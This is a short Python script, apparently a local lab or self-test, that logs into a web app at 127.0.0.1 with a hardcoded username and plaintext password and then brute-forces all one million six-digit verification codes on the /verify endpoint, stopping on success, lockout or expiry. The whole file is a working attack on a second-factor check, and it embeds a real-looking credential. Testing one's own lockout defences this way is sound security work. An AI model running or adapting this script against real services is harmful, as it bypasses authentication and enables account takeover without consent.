import requests

# Logging in with known credentials (bypassing real user actions and simulating entry into the CAPTCHA phase)
session = requests.Session()
login_url = "http://127.0.0.1:5000/"
verify_url = "http://127.0.0.1:5000/verify"

# Fill in a real username and password
username = "yihan"
password = "lyh2002626"  # this is the correct password

# Step 1: Login to get the verification code interface
login_response = session.post(login_url, data={
    "username": username,
    "password": password
})

if "verify" not in login_response.url:
    print("❌ Login failed. Cannot reach verification step.")
    exit()

print("✅ Login succeeded. Starting code brute force...")

# Step 2: Brute force 6-digit CAPTCHA (000000 to 999999)
for i in range(1000000):
    code = str(i).zfill(6)  # Make up 6 digits, e.g. 000001
    response = session.post(verify_url, data={"code": code})

    print(f"Trying code: {code} → Response: {response.text[:60]}")

    if "query" in response.url:
        print(f"✅ Code cracked: {code}")
        break

    if "Too many incorrect attempts" in response.text:
        print("🚫 Reached attempt limit. System blocked further attempts.")
        break

    if "expired" in response.text:
        print("⏰ Code expired. Need to relogin.")
        break
